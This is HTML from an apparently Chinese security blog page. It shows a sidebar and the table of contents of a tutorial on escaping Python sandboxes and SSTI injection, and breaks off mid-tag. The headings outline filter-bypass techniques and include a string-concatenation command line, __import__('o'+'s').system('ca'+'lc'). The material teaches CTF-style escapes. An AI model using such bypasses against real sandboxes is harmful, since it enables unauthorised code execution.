          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">42</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">10</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/yourname" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="mailto:yourname@gmail.com" target="_blank" title="E-Mail">
                      
                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                  </span>
                
            </div>
          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                友情链接
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="https://blog.wonderkun.cc/" title="wonderkun" target="_blank">wonderkun</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://example.com/" title="Title" target="_blank">Title</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言："><span class="nav-number">1.</span> <span class="nav-text">前言：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01-基础知识"><span class="nav-number">1.1.</span> <span class="nav-text">0x01 基础知识</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#dir-函数"><span class="nav-number">1.2.</span> <span class="nav-text">dir()函数</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#dir-函数不带参数时，返回当前范围内的变量、方法和定义的类型列表；带参数时，返回参数的属性、方法列表。如果参数包含方法dir-，该方法将被调用。如果参数不包含dir-，该方法将最大限度地收集参数信息。"><span class="nav-number">1.2.1.</span> <span class="nav-text">dir() 函数不带参数时，返回当前范围内的变量、方法和定义的类型列表；带参数时，返回参数的属性、方法列表。如果参数包含方法dir()，该方法将被调用。如果参数不包含dir()，该方法将最大限度地收集参数信息。</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#builtins"><span class="nav-number">1.3.</span> <span class="nav-text">__builtins__</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#builtins-即是引用，Python程序一旦启动，它就会在程序员所写的代码运行之前就已经被加载到内存中了，而对于-builtins-却不用导入，它在任何模块都直接可见，所以可以直接调用引用的模块。"><span class="nav-number">1.3.1.</span> <span class="nav-text">__builtins__即是引用，Python程序一旦启动，它就会在程序员所写的代码运行之前就已经被加载到内存中了，而对于__builtins__却不用导入，它在任何模块都直接可见，所以可以直接调用引用的模块。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#可以通过dir-函数来查看该模块内包含的函数，同时也可以通过dict属性调用这些函数。"><span class="nav-number">1.3.2.</span> <span class="nav-text">可以通过dir()函数来查看该模块内包含的函数，同时也可以通过dict属性调用这些函数。</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#import"><span class="nav-number">1.4.</span> <span class="nav-text">__import__</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#import-接收字符串作为参数，导入该字符串名称的模块。"><span class="nav-number">1.4.1.</span> <span class="nav-text">__import__接收字符串作为参数，导入该字符串名称的模块。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#如import-sys相当于-import-‘sys’-，另外由于参数是字符串的形式，因此在某些情况下可利用字符串拼接的方式Bypass过滤，如：-import-‘o’-’s’-system-‘ca’-’lc’-。"><span class="nav-number">1.4.2.</span> <span class="nav-text">如import sys相当于__import__(‘sys’)，另外由于参数是字符串的形式，因此在某些情况下可利用字符串拼接的方式Bypass过滤，如：__import__(‘o’+’s’).system(‘ca’+’lc’)。</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#bases"><span class="nav-number">1.5.</span> <span class="nav-text">__bases__</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#返回一个类直接所继承的类-元组表示"><span class="nav-number">1.5.1.</span> <span class="nav-text">返回一个类直接所继承的类(元组表示)</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#mro"><span class="nav-number">1.6.</span> <span class="nav-text">__mro__</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#method-resolution-order-解析方法调用的顺序"><span class="nav-number">1.6.1.</span> <span class="nav-text">method resolution order(解析方法调用的顺序)</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#可以看出-base-返回第一个调用的基类，-mro-表示调用的顺序。"><span class="nav-number">1.6.2.</span> <span class="nav-text">可以看出__base__返回第一个调用的基类，__mro__表示调用的顺序。</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#class"><span class="nav-number">1.7.</span> <span class="nav-text">__class__</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#返回一个实例所属的类"><span class="nav-number">1.7.1.</span> <span class="nav-text">返回一个实例所属的类</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#class-指明了所属的类型"><span class="nav-number">1.8.</span> <span class="nav-text">__class__指明了所属的类型</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#globals"><span class="nav-number">1.9.</span> <span class="nav-text">__globals__</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#globals-是一个特殊属性，能够返回函数所在模块命名空间的所有变量，其中包含了很多已经引入的modules。"><span class="nav-number">1.9.1.</span> <span class="nav-text">__globals__是一个特殊属性，能够返回函数所在模块命名空间的所有变量，其中包含了很多已经引入的modules。</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#object类"><span class="nav-number">1.10.</span> <span class="nav-text">object类</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#python的object类中集成了很多的基础函数，我们想要调用的时候也是需要用object去操作的，主要是通过-mro-和-bases-两种方式来创建object的方法如下："><span class="nav-number">1.10.1.</span> <span class="nav-text">python的object类中集成了很多的基础函数，我们想要调用的时候也是需要用object去操作的，主要是通过__mro__和__bases__两种方式来创建object的方法如下：</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#subclasses"><span class="nav-number">1.11.</span> <span class="nav-text">__subclasses__()</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#获取一个类的子类，返回的是一个列表"><span class="nav-number">1.11.1.</span> <span class="nav-text">获取一个类的子类，返回的是一个列表</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#builtin-和-builtins"><span class="nav-number">1.12.</span> <span class="nav-text">__builtin__ 和 __builtins__</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#python中可以直接运行一些函数，例如int-list-等等。这些函数可以在-builtins-中可以查到。查看的方法是dir-builtins-。在控制台中直接输入-builtins-会看到如下情况-。"><span class="nav-number">1.12.1.</span> <span class="nav-text">python中可以直接运行一些函数，例如int(),list()等等。这些函数可以在__builtins__中可以查到。查看的方法是dir(__builtins__)。在控制台中直接输入__builtins__会看到如下情况.。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ps：在py3中-builtin-被换成了builtin"><span class="nav-number">1.12.2.</span> <span class="nav-text">ps：在py3中__builtin__被换成了builtin</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#builtin-和-builtins-之间是什么关系呢？"><span class="nav-number">1.12.3.</span> <span class="nav-text">__builtin__ 和 __builtins__之间是什么关系呢？</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#1、在主模块main中，-builtins-是对内建模块-builtin-本身的引用，即-builtins-完全等价于-builtin-，二者完全是一个东西，不分彼此。"><span class="nav-number">1.12.4.</span> <span class="nav-text">1、在主模块main中，__builtins__是对内建模块__builtin__本身的引用，即__builtins__完全等价于__builtin__，二者完全是一个东西，不分彼此。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2、非主模块main中，-builtins-仅是对-builtin-dict-的引用，而非-builtin-本身"><span class="nav-number">1.12.5.</span> <span class="nav-text">2、非主模块main中，__builtins__仅是对__builtin__.__dict__的引用，而非__builtin__本身</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#模板的导入"><span class="nav-number">1.13.</span> <span class="nav-text">模板的导入</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#常规的导入方式："><span class="nav-number">1.13.1.</span> <span class="nav-text">常规的导入方式：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#除此之外，也可以通过路径引入模块，如在Linux系统中Python的os模块的路径一般都是在-usr-lib-python2-7-os-py，当知道路径的时候，我们就可以通过如下的操作导入模块，然后进一步使用相关函数："><span class="nav-number">1.13.2.</span> <span class="nav-text">除此之外，也可以通过路径引入模块，如在Linux系统中Python的os模块的路径一般都是在 /usr/lib/python2.7/os.py，当知道路径的时候，我们就可以通过如下的操作导入模块，然后进一步使用相关函数：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#import导入机制：当-import-一个模块时首先会在-sys-modules-这个字典中查找是否已经加载了此模块，如果加载了则只是将模块的名字加入到正在调用-import-的模块的-Local-命名空间中。如果没有加载则从-sys-path-目录中按照模块名称查找模块文件，模块可以是-py、pyc、pyd，找到后将模块载入内存，并加到-sys-modules-中，并将名称导入到当前的-Local-命名空间。"><span class="nav-number">1.13.3.</span> <span class="nav-text">import导入机制：当 import 一个模块时首先会在 sys.modules 这个字典中查找是否已经加载了此模块，如果加载了则只是将模块的名字加入到正在调用 import 的模块的 Local 命名空间中。如果没有加载则从 sys.path 目录中按照模块名称查找模块文件，模块可以是 py、pyc、pyd，找到后将模块载入内存，并加到 sys.modules 中，并将名称导入到当前的 Local 命名空间。</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02-可利用的模块和方法"><span class="nav-number">1.14.</span> <span class="nav-text">0x02 可利用的模块和方法</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#在-Python-的内建函数中，有一些函数可以帮助我们实现命令执行或文件操作的利用。"><span class="nav-number">1.14.1.</span> <span class="nav-text">在 Python 的内建函数中，有一些函数可以帮助我们实现命令执行或文件操作的利用。</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#命令执行类"><span class="nav-number">1.15.</span> <span class="nav-text">命令执行类</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#os模块"><span class="nav-number">1.15.1.</span> <span class="nav-text">os模块</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#commands模块"><span class="nav-number">1.15.2.</span> <span class="nav-text">commands模块</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#commands模块会返回命令的输出和执行的状态位，仅限Linux环境"><span class="nav-number">1.15.3.</span> <span class="nav-text">commands模块会返回命令的输出和执行的状态位，仅限Linux环境</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#subprocess模块"><span class="nav-number">1.16.</span> <span class="nav-text">subprocess模块</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#pty模块"><span class="nav-number">1.17.</span> <span class="nav-text">pty模块</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#仅限Linux环境"><span class="nav-number">1.17.1.</span> <span class="nav-text">仅限Linux环境</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#timeit模块"><span class="nav-number">1.18.</span> <span class="nav-text">timeit模块</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#platform模块"><span class="nav-number">1.19.</span> <span class="nav-text">platform模块</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#import-函数"><span class="nav-number">1.20.</span> <span class="nav-text">__import__()函数</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#这个函数只是通过引入其他命令执行库实现命令执行："><span class="nav-number">1.20.1.</span> <span class="nav-text">这个函数只是通过引入其他命令执行库实现命令执行：</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#importlib模块"><span class="nav-number">1.21.</span> <span class="nav-text">importlib模块</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#exec-eval-execfile-compile-函数"><span class="nav-number">1.22.</span> <span class="nav-text">exec()/eval()/execfile()/compile()函数</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#这几个函数都能执行参数的Python代码。"><span class="nav-number">1.22.1.</span> <span class="nav-text">这几个函数都能执行参数的Python代码。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#注意：execfile-只存在于Python2，Python3没有该函数。"><span class="nav-number">1.22.2.</span> <span class="nav-text">注意：execfile()只存在于Python2，Python3没有该函数。</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#sys模块"><span class="nav-number">1.23.</span> <span class="nav-text">sys模块</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#该模块通过modules-函数引入命令执行模块来实现："><span class="nav-number">1.23.1.</span> <span class="nav-text">该模块通过modules()函数引入命令执行模块来实现：</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#文件操作类"><span class="nav-number">1.24.</span> <span class="nav-text">文件操作类</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#file-函数"><span class="nav-number">1.24.1.</span> <span class="nav-text">file()函数</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#注意：该函数只存在py2中"><span class="nav-number">1.24.2.</span> <span class="nav-text">注意：该函数只存在py2中</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#open-函数"><span class="nav-number">1.24.3.</span> <span class="nav-text">open()函数</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#codecs模块"><span class="nav-number">1.24.4.</span> <span class="nav-text">codecs模块</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#获取当前python的环境信息"><span class="nav-number">1.25.</span> <span class="nav-text">获取当前python的环境信息</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#sys模块-1"><span class="nav-number">1.25.1.</span> <span class="nav-text">sys模块</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x03-沙箱逃逸技巧"><span class="nav-number">1.26.</span> <span class="nav-text">0x03 沙箱逃逸技巧</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#元素链"><span class="nav-number">1.27.</span> <span class="nav-text">元素链</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#构造过程"><span class="nav-number">1.27.1.</span> <span class="nav-text">构造过程</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#由前面知道，我们可以通过如下方式获取object类："><span class="nav-number">1.27.2.</span> <span class="nav-text">由前面知道，我们可以通过如下方式获取object类：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#然后通过object类的-subclasses-方法获取所有的子类列表（Python2和Python3获取的子类不同）："><span class="nav-number">1.27.3.</span> <span class="nav-text">然后通过object类的__subclasses__()方法获取所有的子类列表（Python2和Python3获取的子类不同）：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#找到重载过的-init-类，例如："><span class="nav-number">1.27.4.</span> <span class="nav-text">找到重载过的__init__类，例如：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#在获取初始化属性后，带wrapper的说明没有重载，寻找不带warpper的，因为wrapper是指这些函数并没有被重载，这时它们并不是function，不具有-globals-属性。"><span class="nav-number">1.27.5.</span> <span class="nav-text">在获取初始化属性后，带wrapper的说明没有重载，寻找不带warpper的，因为wrapper是指这些函数并没有被重载，这时它们并不是function，不具有__globals__属性。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#写个脚本帮我们来筛选出重载过的-init-类的类："><span class="nav-number">1.27.6.</span> <span class="nav-text">写个脚本帮我们来筛选出重载过的__init__类的类：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#重载过的-init-类的类具有-globals-属性，这里以WarningMessage为例，会返回很多dict类型："><span class="nav-number">1.27.7.</span> <span class="nav-text">重载过的__init__类的类具有__globals__属性，这里以WarningMessage为例，会返回很多dict类型：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#寻找keys中的-builtins-来查看引用，这里同样会返回很多dict类型："><span class="nav-number">1.27.8.</span> <span class="nav-text">寻找keys中的__builtins__来查看引用，这里同样会返回很多dict类型：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#再在keys中寻找可利用的函数即可，如file-函数为例："><span class="nav-number">1.27.9.</span> <span class="nav-text">再在keys中寻找可利用的函数即可，如file()函数为例：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#至此，整个元素链调用的构造过程就走了一遍了，下面看看还有哪些可利用的函数。"><span class="nav-number">1.27.10.</span> <span class="nav-text">至此，整个元素链调用的构造过程就走了一遍了，下面看看还有哪些可利用的函数。</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#使用脚本遍历其他逃逸方法："><span class="nav-number">1.28.</span> <span class="nav-text">使用脚本遍历其他逃逸方法：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#py2脚本如下："><span class="nav-number">1.29.</span> <span class="nav-text">py2脚本如下：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#运行结果如下："><span class="nav-number">1.30.</span> <span class="nav-text">运行结果如下：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#下面简单归纳为4种方式："><span class="nav-number">1.30.1.</span> <span class="nav-text">下面简单归纳为4种方式：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#序号为40，即file-函数，进行文件读取和写入，payload如下："><span class="nav-number">1.30.2.</span> <span class="nav-text">序号为40，即file()函数，进行文件读取和写入，payload如下：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#这和前面元素链构造时给出的Demo有点区别："><span class="nav-number">1.30.3.</span> <span class="nav-text">这和前面元素链构造时给出的Demo有点区别：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#序号59是WarningMessage类，其具有globals属性，包含builtins，其中含有file-函数，属于第二种方式；而这里是直接在object类的所有子类中直接找到了file-函数的序号为40，直接调用即可。"><span class="nav-number">1.30.4.</span> <span class="nav-text">序号59是WarningMessage类，其具有globals属性，包含builtins，其中含有file()函数，属于第二种方式；而这里是直接在object类的所有子类中直接找到了file()函数的序号为40，直接调用即可。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#当然也可以通过调用index-函数的方式来寻找file-函数是否在object类的子类中且序号是多少："><span class="nav-number">1.30.5.</span> <span class="nav-text">当然也可以通过调用index()函数的方式来寻找file()函数是否在object类的子类中且序号是多少：</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#第二种方式："><span class="nav-number">1.31.</span> <span class="nav-text">第二种方式：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#先看序号为59的WarningMessage类有哪些而利用的模块或方法："><span class="nav-number">1.31.1.</span> <span class="nav-text">先看序号为59的WarningMessage类有哪些而利用的模块或方法：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#以linecache中的os为例，这里简单解释下工具的寻找过程依次如下："><span class="nav-number">1.31.2.</span> <span class="nav-text">以linecache中的os为例，这里简单解释下工具的寻找过程依次如下：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#payload如下："><span class="nav-number">1.31.3.</span> <span class="nav-text">payload如下：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#序号为60的catch-warnings类利用payload同上。"><span class="nav-number">1.31.4.</span> <span class="nav-text">序号为60的catch_warnings类利用payload同上。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#序号为61、62的两个类均只有-builtins-可利用，利用payload同上。"><span class="nav-number">1.31.5.</span> <span class="nav-text">序号为61、62的两个类均只有__builtins__可利用，利用payload同上。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#序号为72、77的两个类-Printer和Quitter，相比前面的，没见过的有os和traceback，但只有os模块可利用："><span class="nav-number">1.31.6.</span> <span class="nav-text">序号为72、77的两个类_Printer和Quitter，相比前面的，没见过的有os和traceback，但只有os模块可利用：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#序号为78、79的两个类IncrementalEncoder和IncrementalDecoder，相比前面的，没见过的有open："><span class="nav-number">1.31.7.</span> <span class="nav-text">序号为78、79的两个类IncrementalEncoder和IncrementalDecoder，相比前面的，没见过的有open：</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#第三种方式："><span class="nav-number">1.32.</span> <span class="nav-text">第三种方式：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#先看下序号为59的WarningMessage类："><span class="nav-number">1.32.1.</span> <span class="nav-text">先看下序号为59的WarningMessage类：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#注意是通过values-函数中的数组序号来填写第二个数值实现调用，以下以eval为示例，其他的利用payload和前面的差不多就不再赘述了："><span class="nav-number">1.32.2.</span> <span class="nav-text">注意是通过values()函数中的数组序号来填写第二个数值实现调用，以下以eval为示例，其他的利用payload和前面的差不多就不再赘述了：</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#其他类似修改即可。"><span class="nav-number">1.33.</span> <span class="nav-text">其他类似修改即可。</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#第四种方式"><span class="nav-number">1.34.</span> <span class="nav-text">第四种方式</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#这里只有一种序号，为60："><span class="nav-number">1.34.1.</span> <span class="nav-text">这里只有一种序号，为60：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#调用示例如下，其他类似修改即可："><span class="nav-number">1.34.2.</span> <span class="nav-text">调用示例如下，其他类似修改即可：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#前面的脚本是针对Python2的，这里再贴个Python3的脚本，原理一致："><span class="nav-number">1.34.3.</span> <span class="nav-text">前面的脚本是针对Python2的，这里再贴个Python3的脚本，原理一致：</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#过滤-globals"><span class="nav-number">1.35.</span> <span class="nav-text">过滤__globals__</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#当-globals-被禁用时，"><span class="nav-number">1.35.1.</span> <span class="nav-text">当__globals__被禁用时，</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#如："><span class="nav-number">1.35.2.</span> <span class="nav-text">如：</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#过滤-mro-或-bases-或-base"><span class="nav-number">1.36.</span> <span class="nav-text">过滤__mro__或__bases__或__base__</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#两者可互相替换来Bypass其中之一被禁用的情况，但需要注意两者获取object类时的格式区别："><span class="nav-number">1.36.1.</span> <span class="nav-text">两者可互相替换来Bypass其中之一被禁用的情况，但需要注意两者获取object类时的格式区别：</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#如：-1"><span class="nav-number">1.37.</span> <span class="nav-text">如：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#base64编码"><span class="nav-number">1.38.</span> <span class="nav-text">base64编码</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#对关键字进行base64编码可绕过一些明文检测机制："><span class="nav-number">1.38.1.</span> <span class="nav-text">对关键字进行base64编码可绕过一些明文检测机制：</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#reload-方法"><span class="nav-number">1.39.</span> <span class="nav-text">reload()方法</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#某些情况下，通过del将一些模块的某些方法给删除掉了，但是我们可以通过reload-函数重新加载该模块，从而可以调用删除掉的可利用的方法："><span class="nav-number">1.39.1.</span> <span class="nav-text">某些情况下，通过del将一些模块的某些方法给删除掉了，但是我们可以通过reload()函数重新加载该模块，从而可以调用删除掉的可利用的方法：</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#字符串拼接"><span class="nav-number">1.40.</span> <span class="nav-text">字符串拼接</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#凡是以字符串形式作为参数的都可以使用拼接的形式来绕过特定关键字的检测。"><span class="nav-number">1.40.1.</span> <span class="nav-text">凡是以字符串形式作为参数的都可以使用拼接的形式来绕过特定关键字的检测。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#如：-2"><span class="nav-number">1.40.2.</span> <span class="nav-text">如：</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#过滤中括号"><span class="nav-number">1.41.</span> <span class="nav-text">过滤中括号</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#当中括号-被过滤掉时，"><span class="nav-number">1.41.1.</span> <span class="nav-text">当中括号[]被过滤掉时，</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#调用-getitem-函数直接替换；"><span class="nav-number">1.41.2.</span> <span class="nav-text">调用__getitem__()函数直接替换；</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#调用pop-函数（用于移除列表中的一个元素，默认最后一个元素，并且返回该元素的值）替换；"><span class="nav-number">1.41.3.</span> <span class="nav-text">调用pop()函数（用于移除列表中的一个元素，默认最后一个元素，并且返回该元素的值）替换；</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#如：-3"><span class="nav-number">1.41.4.</span> <span class="nav-text">如：</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x05-ssti注入"><span class="nav-number">1.42.</span> <span class="nav-text">0x05 ssti注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#题目环境搭建如下："><span class="nav-number">1.43.</span> <span class="nav-text">题目环境搭建如下：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#分析太多了，由于没有过滤随便搞。"><span class="nav-number">1.44.</span> <span class="nav-text">分析太多了，由于没有过滤随便搞。</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#一道金典的ctf题目"><span class="nav-number">1.45.</span> <span class="nav-text">一道金典的ctf题目</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#这道题目运行在python2-7的环境，在删除-import-等危险函数的同时也删除了-reload。"><span class="nav-number">1.45.1.</span> <span class="nav-text">这道题目运行在python2.7的环境，在删除__import__等危险函数的同时也删除了 reload。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#可以用如下的payload绕过："><span class="nav-number">1.45.2.</span> <span class="nav-text">可以用如下的payload绕过：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#这是另一个payload："><span class="nav-number">1.45.3.</span> <span class="nav-text">这是另一个payload：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#前一部分思路类似于读文件，就来到这。"><span class="nav-number">1.45.4.</span> <span class="nav-text">前一部分思路类似于读文件，就来到这。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#可以看到是获取了一个warnings-WarningMessage类，然后继续执行-init-后获取全局变量"><span class="nav-number">1.45.5.</span> <span class="nav-text">可以看到是获取了一个warnings.WarningMessage类，然后继续执行__init__后获取全局变量</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#func-globals返回一个包含函数全局变量的字典引用"><span class="nav-number">1.45.6.</span> <span class="nav-text">func_globals返回一个包含函数全局变量的字典引用</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#然后获取linecache模块（其中包含了os模块）"><span class="nav-number">1.45.7.</span> <span class="nav-text">然后获取linecache模块（其中包含了os模块）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#然后用-dict-获取指定模块（由于对输入的字符进行了限制，所以要找个利用字符串获取指定模块的方式）"><span class="nav-number">1.45.8.</span> <span class="nav-text">然后用__dict__获取指定模块（由于对输入的字符进行了限制，所以要找个利用字符串获取指定模块的方式）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#dict-是一个字典，键为属性名，值为属性值"><span class="nav-number">1.45.9.</span> <span class="nav-text">__dict__是一个字典，键为属性名，值为属性值</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#直接逃逸就好了："><span class="nav-number">1.45.10.</span> <span class="nav-text">直接逃逸就好了：</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x06-绕过再分析"><span class="nav-number">1.46.</span> <span class="nav-text">0x06 绕过再分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用继承链绕过沙盒。"><span class="nav-number">1.47.</span> <span class="nav-text">利用继承链绕过沙盒。</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#利用file对象读取文件"><span class="nav-number">1.47.1.</span> <span class="nav-text">利用file对象读取文件</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#构造继承链的一种思路是："><span class="nav-number">1.47.2.</span> <span class="nav-text">构造继承链的一种思路是：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#1-随便找到一个内置类对象用-class-拿到他所对应的类"><span class="nav-number">1.47.3.</span> <span 